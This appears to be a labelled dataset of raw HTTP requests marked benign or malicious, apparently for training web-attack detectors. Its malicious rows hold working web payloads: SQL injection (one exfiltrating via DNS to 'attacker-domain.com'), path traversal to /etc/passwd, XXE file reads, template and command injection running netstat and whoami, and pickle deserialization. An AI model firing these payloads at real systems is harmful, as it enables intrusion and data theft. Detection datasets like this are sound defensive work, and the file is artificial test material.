label,text
malicious,"PUT /service/javaObject HTTP/1.1
Host: secure-user-portal.net
User-Agent: Java/1.8.0_291
Content-Type: application/json
Accept-Charset: utf-8, iso-8859-1;q=0.5
Content-Length: 387

{
  ""serialized"": ""rO0ABXNyABtqYXZhLmxhbmcuc3RyaW5nLkxheW1hcAAAAAAAAAAJCAAJbQAECAAFJAARsaXplbnQAEkxqYXZhL2xhbmcvUnVudGltZTsAE01ldGhvZEJhc2UAGkxqYXZhL2xhbmcvUnVudGltZTthbGxlcnQobmV3IGphdmEubGFuZy5TdHJpbmcoKSk7""
}"
benign,"GET /dashboard/widget?id=17 HTTP/1.1
Host: user-analytics-platform.io
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:77.0) Gecko/20100101 Firefox/77.0
Accept: text/html,application/xhtml+xml
DNT: 1
Referer: https://user-analytics-platform.io/
Connection: keep-alive"
malicious,"GET /document?template=../../../../../../../../etc/passwd HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Python-urllib/3.9
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close"
malicious,"POST /v2/logs/submit HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: curl/7.77.0
Accept: */*
Content-Type: application/json
Cache-Control: no-cache
Accept-Language: en-US,en;q=0.9
Content-Length: 209

{
  ""device"": ""sensor-42"",
  ""event_details"": ""Temperature reading normal\"", \""threshold_exceeded\"": false, \""alert_sent\"": false, \""original_event\"": \"""",
  ""timestamp"": ""2024-06-15T13:45:30Z""
}"
benign,"GET /data/v2/order/4592.xml HTTP/1.1
Host: api.online-marketplace.store
Accept: application/xml
User-Agent: Python-urllib/3.11
If-None-Match: ""684b7f2a9e77d34""
Authorization: Token d9f7acdb65e749919aff8a33a5c5f8d3"
benign,"GET /products/electronics/audio/headphones/23455/details HTTP/1.1
Host: online-retail-store.biz
Accept: application/json
DNT: 1
Connection: keep-alive
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.7
User-Agent: curl/7.79.1"
benign,"GET /forum/replies?thread=8675309&callback=processData HTTP/1.1
Host: community.game-dev-forum.org
Accept: application/javascript, */*;q=0.9
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Referer: https://community.game-dev-forum.org/thread/8675309
Connection: keep-alive
Accept-Encoding: gzip, deflate"
benign,"GET /api/openapi.json HTTP/1.1
Host: secure-user-portal.net
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Connection: keep-alive
Accept-Language: en-US,en;q=0.9"
malicious,"GET /api/v2/account/details?user_id=123&user%5Fid=%27%20OR%201%3D1%20-- HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.5
Pragma: no-cache
Connection: keep-alive"
benign,"POST /api/v3/orders HTTP/1.1
Host: api.smart-retail360.biz
Authorization: Bearer mF_9.B5f-4.1JqM
Accept: application/json
Content-Type: application/json
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Mobile Safari/537.36
Content-Language: en-US

{""customerId"":987654,""items"":[{""productId"":232,""quantity"":1},{""productId"":415,""quantity"":3}],""shippingAddress"":{""line1"":""1234 Elm Street"",""city"":""Dayton"",""state"":""OH"",""zip"":""45402""},""paymentMethod"":""credit_card"",""orderNotes"":""Please deliver after 5pm.""}"
malicious,"POST /submit/form HTTP/1.1
Host: secure-login-hub.org
User-Agent: Mozilla/5.0 (compatible; CustomAgent/2.1; +http://crawler.newsite.ai) $(whoami)
Content-Type: application/x-www-form-urlencoded
Content-Length: 27
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.5

username=testuser&password=1234"
benign,"GET /fonts/georgia-pro-italic.woff2 HTTP/1.1
Host: urban-travel-journal.com
Accept: font/woff2,application/font-woff2;q=0.9,*/*;q=0.8
Referer: https://urban-travel-journal.com/themes/travel.css
Origin: https://urban-travel-journal.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0
Connection: keep-alive"
malicious,"GET /redirect?target=data:text/html;base64,PHNjcmlwdD5hbGVydCgnUmVkaXJlY3RlZCEgWFNTJyk8L3NjcmlwdD4= HTTP/1.1
Host: user-login-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: https://user-login-portal.net/app/login
Cookie: session_id=3a7d9ec0f8e34d2f8a4b7e6cd5b123ab"
malicious,"POST /app/data/search HTTP/1.1
Host: analytics-datapoint.ai
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Content-Type: application/x-www-form-urlencoded
Accept: application/json, text/javascript
X-Requested-With: FetchAPIClient
Content-Length: 74

query=records%27]%7D);%20db.logs.remove({user:'attacker'});%20//&limit=10"
malicious,"GET /blog/article/view?slug=secure-payment-gateway HTTP/1.1
Host: my-personal-blog-site.info
X-Forwarded-Host: evil-tracking-domain.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Upgrade-Insecure-Requests: 1
Accept-Encoding: br, gzip, deflate
Connection: keep-alive"
benign,"POST /chat/send HTTP/1.1
Host: community.laptop-helpdesk.ai
User-Agent: Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/plain
Cookie: session_id=b73a9f7d429e1ad3
Content-Length: 28

message=/dance_move speedy_rotate"
malicious,"POST /upload/processDocument HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: application/xml, text/html, */*
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate
Origin: https://api.cloud-data-services.ai
Content-Type: multipart/form-data; boundary=----BoundaryMobile321
Content-Length: 460

------BoundaryMobile321
Content-Disposition: form-data; name=""description""

User config upload
------BoundaryMobile321
Content-Disposition: form-data; name=""file""; filename=""userconfig.xml""
Content-Type: application/xml

<?xml version=""1.0""?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///c:/windows/win.ini"">]>
<config>&xxe;</config>
------BoundaryMobile321--"
malicious,"POST /ticket/submit HTTP/1.1
Host: support.enterprise-solutions.biz
Content-Type: application/x-www-form-urlencoded
Content-Length: 101
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Referer: https://support.enterprise-solutions.biz/ticket/new
Accept-Encoding: gzip, deflate

subject=Server%20issue&description=Error%20logs%0adf%20-h%0arc%20%2Ftmp%2Fexploit.log"
malicious,"POST /api/v2/ldapsearch HTTP/1.1
Host: connect-valuespace.net
User-Agent: curl/7.77.0
Content-Type: application/x-www-form-urlencoded
Accept: */*
Content-Length: 56

user_id=validuser%29%28objectClass%3D*%29&attributes=%2A"
benign,"GET /search/products?q=headphones&sort=price_asc HTTP/1.1
Host: audio-masters.tech
User-Agent: Mozilla/5.0 (Linux; Android 13; SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36
Accept: application/json
DNT: 1
Accept-Encoding: gzip, deflate
Connection: keep-alive"
benign,"PUT /v2/projects/4b85f2e9/configuration HTTP/1.1
Host: api.cloud-data-services.ai
Authorization: Token 53a9d941cb10e2aa61d4f3a78972c1bf
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

{
  ""environment"": ""production"",
  ""build"": {
    ""version"": ""3.14.7"",
    ""features"": [""logging"", ""metrics"", ""auto-scaling""],
    ""overrides"": {
      ""cpu_limit"": ""4"",
      ""memory_limit_gb"": 16,
      ""deploy_regions"": [""us-east-1"", ""eu-central-1""]
    }
  },
  ""metadata"": {
    ""owner"": ""j.davison"",
    ""maintainers"": [""alice.s@cloud-data.ai"", ""brian.t@cloud-data.ai""],
    ""created_at"": ""2024-05-12T09:22:45Z""
  }
}"
benign,"GET /static/scripts/v3/app.js HTTP/1.1
Host: dev-portal-cloud.net
Connection: keep-alive
Accept: application/javascript, */*;q=0.9
Referer: https://dev-portal-cloud.net/dashboard
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.198 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9"
benign,"GET /forum/topics?query=how%20to%20bake%20bread HTTP/1.1
Host: community-kitchen-talk.net
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.129 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: br, gzip, deflate
Accept-Language: en-US,en;q=0.8
Referer: https://community-kitchen-talk.net/
Connection: keep-alive
Cookie: sessionId=2b1f9a87c7214d3b8c756572;"
benign,"GET /search?q=wireless+headphones HTTP/1.1
Host: online-retail-store.biz:8088
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:112.0) Gecko/20100101 Firefox/112.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: https://online-retail-store.biz/
Connection: keep-alive"
malicious,"POST /account/preferences HTTP/1.1
Host: secure-user-portal.net
User-Agent: curl/7.75.0
Content-Type: application/x-www-form-urlencoded
Accept: */*
Content-Length: 56
Cookie: user_session=abc123xyz456

pref_lang=en-US&display_mode=compact'%7D%2C%20%24or%3A%20%5B%7Badmin%3Atrue%7D%5D%20--%20"
malicious,"GET /validate?message=check_status%0d%0a198.51.100.42 - eviluser [03/May/2024:18:45:00 -0400] ""GET /validate?message=check_status HTTP/1.1"" 400 512 HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Wget/1.21.1 (linux-gnu)
Accept: */*
Referer: https://status.api.cloud-data-services.ai/home
Connection: close"
benign,"PATCH /api/v1/settings HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.133 Mobile Safari/537.36
Accept: application/json
Content-Type: application/json-patch+json
Authorization: Bearer vx9N8pT2mBQLpz5fjkD7YaWcnOqZ0Jvx
Connection: close
Content-Length: 94

[
  {""op"": ""remove"", ""path"": ""/preferences/marketingEmails""},
  {""op"": ""replace"", ""path"": ""/preferences/language"", ""value"": ""de-DE""}
]"
benign,"POST /contact/send-message HTTP/1.1
Host: urban-gardeners.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 70
Accept: application/json, text/plain, */*
Referer: https://urban-gardeners.net/contact
Origin: https://urban-gardeners.net
DNT: 1
Connection: close

name=Jill%20Martinez&comments=SGF2aW5nIGZ1biBncm93aW5nIG15IHRvbWF0byBwbGFudHMu"
benign,"GET /news/latest HTTP/1.1
Host: my-personal-blog-site.info
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.5
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
Connection: keep-alive"
benign,"GET /whitepapers/2024/urban_development_report.pdf HTTP/1.1
Host: urban-planning-solutions.ai
Accept: application/pdf
Referer: https://urban-planning-solutions.ai/whitepapers/2024/
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15
Accept-Language: en-US,en;q=0.9
Connection: close"
benign,"GET /search/v2/query?query=wireless+headphones&callback=processData HTTP/1.1
Host: shop-online-techstore.biz
Connection: close
Accept: application/javascript
Cache-Control: no-cache
DNT: 1
Referer: https://www.shop-online-techstore.biz/products/audio
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Safari/605.1.15
Accept-Language: en-US,en;q=0.8"
benign,"GET /blog/post/view/7982 HTTP/1.1
Host: my-personal-blog-site.info
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.5
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:114.0) Gecko/20100101 Firefox/114.0"
benign,"GET /post-sitemap.xml HTTP/1.1
Host: urban-nomad-blog.info
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15
Accept: text/xml, application/xml
Accept-Language: en-GB,en;q=0.7
Cache-Control: max-age=0
Connection: keep-alive"
benign,"GET /products/electronics/tv/details?model=param%3DHello%252520World&color=black HTTP/1.1
Host: bestchoice-retail.biz
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1
Accept: application/json, */*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Origin: https://bestchoice-retail.biz"
benign,"POST /feedback/submit HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:113.0) Gecko/20100101 Firefox/113.0
Content-Type: application/json
Accept-Encoding: gzip, deflate
Content-Length: 47
Referer: https://community.game-dev-forum.org/feedback

{""UNION ALL"": ""loved the latest patch notes! Thank you.""}"
benign,"PUT /api/blog/posts/542 HTTP/1.1
Host: my-personal-blog-site.info
Authorization: Bearer gG12hiYXCVbnEWZmAWu196AQOSRfzpgD4yHdTlFS
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1
Accept-Language: en-US,en;q=0.8
Accept-Encoding: gzip, deflate
Connection: keep-alive

{""id"":542,""title"":""Exploring Rust for Web Development"",""slug"":""exploring-rust-for-web"",""content"":""This article walks through getting started with Rust in web apps, including tooling and examples."",""tags"":[""rust"",""webdev"",""programming""],""published"":true}"
malicious,"PUT /api/v2/user/updateProfile HTTP/1.1
Host: api.cloud-data-services.ai
Content-Type: application/json
Content-Length: 110
Accept: application/json
User-Agent: curl/7.77.0
X-CSRF-Token: 9a8b7c6d5f123e4a982bf3c7d1caa20b

{""email"": ""jessica.new@cloud-data-services.ai"", ""bio"": ""Security researcher' AnD (SeLeCt CoUnT(*) FroM usErs) > 10 -- ""}"
malicious,"POST /app/user/settings HTTP/1.1
Host: api.fin-tech-solutions.io
User-Agent: Wget/1.21.1 (linux-gnu)
Accept: application/xml
Content-Type: application/xml
Content-Length: 125
Cache-Control: no-cache

<searchRequest>
  <term>' or count(//*)>0 or ''='</term>
  <category>settings</category>
</searchRequest>"
benign,"GET /product/electrogear-ultrawatt-headphones-754/details HTTP/1.1
Host: electrogear-techshop.net
Connection: close
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en;q=0.7
Referer: https://electrogear-techshop.net/categories/headphones
Cookie: sessionid=56b33dc2a81f4d3e8a27fe8b0e115672; cart=3d2a9c5f1e8b4dfc85
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15"
benign,"GET /products/outdoor-gear/tents/model-X45/details HTTP/1.1
Host: rugged-adventures-store.biz
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: text/html,application/xml;q=0.9,*/*;q=0.7
Referer: https://rugged-adventures-store.biz/products/outdoor-gear
Accept-Encoding: gzip, deflate
Connection: keep-alive"
benign,"GET /library/books/upcoming HTTP/1.1
Host: city-public-library.gov
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.7
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: https://city-public-library.gov/home
Cookie: user_pref=locale%3Den-US; session=31ac8e1f2d
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1"
malicious,"POST /api/v2/comments HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: application/json
Content-Type: application/json
Content-Length: 112
Origin: https://community.game-dev-forum.org

{""comment"":""Nice game update! details=user_action=login_failed%0d%0a127.0.0.1 - admin [10/Oct/2023:13:55:36 -0700] \""POST /admin/login HTTP/1.1\"" 200 789""}"
benign,"GET /favicon.ico HTTP/1.1
Host: smart-home-automation.dev
Accept: image/x-icon,image/vnd.microsoft.icon,image/webp,image/apng,*/*;q=0.8
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36
Connection: keep-alive
DNT: 1"
benign,"POST /logout HTTP/1.1
Host: secure-user-portal.net
Content-Type: application/x-www-form-urlencoded
Referer: https://secure-user-portal.net/dashboard
Origin: https://secure-user-portal.net
Cookie: session_id=34af9b74c82d1a56b2f5f7d8a1c3e4f2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Content-Length: 29
Connection: keep-alive

csrf_token=27a65c8b94d2c19f"
malicious,"PATCH /api/custom_data/store HTTP/1.1
Host: secure-user-portal.net
Content-Type: application/json
Content-Length: 326
Origin: https://secure-user-portal.net
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
X-Requested-With: FetchAPIClient
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.9
Cache-Control: no-cache

{
  ""<img src=x onerror=\""eval(String.fromCharCode(0x61, 108, 0145, 114, 0x74, 40, 0x27, 88, 0x53, 0123, 45, 0x4b, 101, 0x79, 0x27, 41))\"">"": ""persistent_key_01"",
  ""device"": ""iPhone12,1"",
  ""timestamp"": ""2024-06-23T17:45:03Z"",
  ""userSettings"": {
    ""notifications"": true,
    ""theme"": ""dark""
  }
}"
malicious,"POST /app/user/settings HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Python-requests/2.25.1
Accept: application/json, text/javascript, */*; q=0.01
X-Session-Pickle: \x80\x03cnative\npopen\nq\x00X\x10\x00\x00\x00id;-\x63\x00\x85q\x01Rq\x02.
Content-Type: application/json
Content-Length: 36

{""settings"":{""theme"":""dark""}}"
benign,"GET /resources/js/vendor/jquery.min.js HTTP/1.1
Host: media-stream-providers.co
Connection: keep-alive
Accept: application/javascript,text/javascript,*/*;q=0.1
Accept-Encoding: gzip, deflate
User-Agent: Wget/1.21.2 (darwin14.0)"
malicious,"GET /downloads/images/%2E%2E%2F%2E%2E%2F%2E%2E/passwd HTTP/1.1
Host: media-digital-archive.ai
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Accept-Language: en-GB,en;q=0.9
Connection: keep-alive
Referer: https://media-digital-archive.ai/gallery/latest"
malicious,"GET /shop/item/details?id=%2527%2520OR%2520%2528SELECT%2520LOAD_FILE%2528CONCAT%2528%2527%255C%255C%255C%255C%2527%252C%2528SELECT%2520version%2528%2529%2529%252C%2527.attacker-domain.com%255C%255Cdata%2527%2529%2529%2529--%2520 HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: sessionid=a9f3e0d2bcae47b59f137c86037a2d9d; userid=74421
Referer: https://login.secure-user-portal.net/app/account
Upgrade-Insecure-Requests: 1"
benign,"GET /content/article/46731?callback=processData&highlight=recent HTTP/1.1
Host: my-personal-blog-site.info
Accept: application/javascript, text/plain, */*;q=0.1
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.78 Mobile Safari/537.36
Accept-Encoding: br, gzip, deflate
Connection: keep-alive"
benign,"GET /api/v1/user/data?cmd=view_details&token=abc123efg456 HTTP/1.1
Host: rapidcloud-services.ai
User-Agent: Python-urllib/3.11
Accept: application/json
Accept-Encoding: gzip, deflate
X-Forwarded-For: 198.51.100.23
Connection: keep-alive
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
malicious,"GET /data/%7B%7Bself.__init__.__globals__.__builtins__.__import__(%27os%27).popen(%27netstat%20-an%27).read()%7D%7D/info HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Python-urllib/3.9
Accept: */*
Accept-Encoding: gzip, deflate
Connection: close"
benign,"GET /gallery/photos/thumbnails/profile-09876-orange-sunset.jpg HTTP/1.1
Host: echo-sketches.artspace
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Referer: https://echo-sketches.artspace/artist/mark-melrose
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15
DNT: 1
Connection: close"
benign,"GET /music/playlists?genre=jazz&genre=blues&genre=soul&quality=high HTTP/1.1
Host: rhythm-vibes.fm
Accept: audio/mpeg, audio/*; q=0.9, */*; q=0.8
Accept-Language: en-US,en;q=0.5
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1
Connection: keep-alive"
benign,"POST /token/oauth2 HTTP/1.1
Host: fastconnect-identity.biz
Content-Type: application/x-www-form-urlencoded
Content-Length: 138
Authorization: Basic ZmFzdGNvbm5lY3Q6ZmNuWjNyOFRwNw==
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Accept: application/json
Connection: keep-alive

grant_type=refresh_token&refresh_token=fast_refresh_token_321abc456&client_id=fastconnect&client_secret=fcKeySecret87&redirect_uri=https%3A%2F%2Ffastconnect-identity.biz%2Foauth%2Fcb"
malicious,"HEAD /profile/edit HTTP/1.1
Host: user-central-datahub.cloud
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept-Language: en-US,en;q=0.9
Cookie: prefs_file=../../../../etc/issue.net%00it-IT; token=9f8a7b6c5d43
Cache-Control: max-age=0"
benign,"POST /reset-password HTTP/1.1
Host: urban-gardeners-community.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 42
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1
Accept-Language: en-us
Referer: https://urban-gardeners-community.net/login

email=jackson.taylor%40urbangardeners.net"
benign,"PATCH /api/v1/settings HTTP/1.1
Host: video-streaming-app.dev
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: application/json
Content-Type: application/json-patch+json
Referer: https://video-streaming-app.dev/user/profile
Content-Length: 81
Connection: keep-alive

[{""op"": ""replace"", ""path"": ""/playback/quality"", ""value"": ""1080p""}]"
benign,"POST /events/rsvp HTTP/1.1
Host: cityculturespace.io
Content-Type: application/x-www-form-urlencoded
Content-Length: 43
User-Agent: Mozilla/5.0 (Linux; Android 13; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36
Accept-Language: en-US,en;q=0.8
Origin: https://cityculturespace.io
Referer: https://cityculturespace.io/events/2023
Connection: keep-alive
Cookie: sessionid=XY89Qlafn20F8tu9v1W;

event_id=4821&attending=yes&seating=balcony"
malicious,"POST /admin/config HTTP/1.1
Host: control-panel.securehost.ai
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Content-Type: application/json
Accept: application/json
X-User-Role: admin
Content-Length: 44

{""max_connections"":100,""enable_logs"":false}"
benign,"PATCH /members/48391/profile HTTP/1.1
Host: my-personal-blog-site.info
Authorization: Bearer Zx81hd7FunR342ksP02fJlNuTmdW3Vc2
Content-Type: application/json-patch+json
Accept: */*
User-Agent: curl/7.88.1
Content-Length: 73

[{""op"": ""replace"", ""path"": ""/bio"", ""value"": ""Passionate traveler and photographer.""}]"
benign,"GET /api/v1/orders?customer_id=78154&status=shipped HTTP/1.1
Host: orders.efficient-sales-platform.biz
Accept: application/json
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:111.0) Gecko/20100101 Firefox/111.0
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNzgxNTQiLCJpc3MiOiJlZmZpY2llbnQtc2FsZXMifQ.TrT27PaSrE2CxQV6pkSyJqvRjp-SK83t0XbXDYppLQE
Accept-Encoding: gzip
Connection: close"
